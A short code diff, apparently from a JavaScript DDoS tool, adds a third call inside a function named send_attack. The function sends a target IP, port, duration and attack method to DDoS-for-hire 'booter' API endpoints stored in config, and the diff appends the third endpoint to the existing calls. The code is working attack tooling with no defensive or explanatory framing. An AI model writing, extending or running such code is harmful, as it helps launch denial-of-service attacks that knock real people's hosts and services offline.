@@ -100,6 +100,9 @@ exports.send_attack = async function(ip, port, time, method) {
     let rreturn1 = await(await fetch(config.BOOTERAPI2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
     console.log(rreturn1);
     response += "API 2: " + await func.get_api_response(rreturn1) + "\r\n";
+    let rreturn2 = await(await fetch(config.BOOTERAPI3 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log(rreturn2);
+    response += "API 3: " + await func.get_api_response(rreturn2) + "\r\n";
     return response;
 }
 
